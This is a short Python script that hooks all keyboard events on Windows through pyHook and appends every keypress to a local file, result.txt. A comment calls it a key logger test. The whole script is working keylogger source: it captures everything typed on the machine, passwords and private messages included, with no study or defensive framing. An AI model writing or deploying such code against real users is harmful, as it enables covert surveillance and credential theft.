import pythoncom, pyHook

FILE_NAME = "result.txt"

def OnKeyboardEvent(event):
    try:
        print("key: ", event.Key)
        print("Ascii: ", event.Ascii)
        with open(FILE_NAME, "a") as f:
            info = "key: " + str(event.Key) + "\n"
            f.write(info)

    except TypeError as error:
        print("Error: ", error)

# return True to pass th event to other handlers.
    return True


# create a hook manager.python key logger test
hm = pyHook.HookManager()
# watch for all events.
hm.KeyDown = OnKeyboardEvent
# set the hook.
hm.HookKeyboard()
# wait forever.
pythoncom.PumpMessages()